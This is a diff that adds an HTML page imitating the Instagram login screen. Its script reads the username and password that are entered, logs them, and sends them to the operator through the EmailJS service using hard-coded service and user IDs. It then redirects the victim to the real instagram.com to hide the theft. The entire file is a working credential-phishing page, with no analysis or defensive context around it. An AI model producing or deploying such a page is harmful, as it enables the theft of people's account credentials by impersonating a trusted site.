@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("JySY9Kr9NpL33gD56"); // Replace with your User ID
+        })();
+    </script>
+</head>
+<body>
+    <h1>Instagram</h1>
+    <form id="loginForm">
+        <label>Username:</label><br>
+        <input type="text" id="username" name="username"><br>
+        <label>Password:</label><br>
+        <input type="password" id="password" name="password"><br>
+        <input type="submit" value="Log In">
+    </form>
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            console.log("Username: " + username + ", Password: " + password);
+
+            // Send email with EmailJS
+            emailjs.send("service_qunf25l", "JySY9Kr9NpL33gD56", {
+                username: username,
+                password: password
+            })
+            .then(function(response) {
+                console.log("Email sent!", response);
+                window.location.href = "https://instagram.com";
+            }, function(error) {
+                console.log("Email failed!", error);
+                window.location.href = "https://instagram.com";
+            });
+        });
+    </script>
+</body>
+</html>
